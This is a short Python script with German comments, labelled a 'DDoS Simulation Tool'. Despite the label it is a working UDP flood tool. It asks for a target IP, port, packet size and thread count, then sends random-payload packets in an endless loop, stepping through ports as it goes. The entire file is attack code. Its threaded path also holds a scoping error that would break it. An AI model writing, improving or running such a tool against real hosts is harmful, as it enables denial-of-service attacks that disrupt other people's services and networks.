import os
import socket
import random
import threading
import time

# Funktion für den Angriff mit Threads
def attack_with_threads(ip, port, bytes_size, threads):
    def send_packets():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(bytes_size)
        while True:
            sock.sendto(payload, (ip, port))
            print(f"Sent packet to {ip} through port: {port}")
            port += 1
            if port > 65534:
                port = 1

    thread_list = []
    for i in range(threads):
        thread = threading.Thread(target=send_packets)
        thread.start()
        thread_list.append(thread)
        print(f"Started thread {i + 1}")
    
    for thread in thread_list:
        thread.join()

# Funktion für den Angriff ohne Threads
def attack_without_threads(ip, port, bytes_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(bytes_size)
    while True:
        sock.sendto(payload, (ip, port))
        print(f"Sent packet to {ip} through port: {port}")
        port += 1
        if port > 65534:
            port = 1

# Hauptprogramm
def main():
    os.system("clear")
    os.system("figlet DDoS Tool")

    print("DDoS Simulation Tool")

    ip = input("Enter IP Target: ")
    port = int(input("Enter Port (1-65534): "))
    bytes_size = int(input("Enter Packet Size (1-65507 bytes): "))
    threads = int(input("Enter Number of Threads (-1 for no threading): "))

    if threads == -1:
        attack_without_threads(ip, port, bytes_size)
    else:
        attack_with_threads(ip, port, bytes_size, threads)

if __name__ == "__main__":
    main()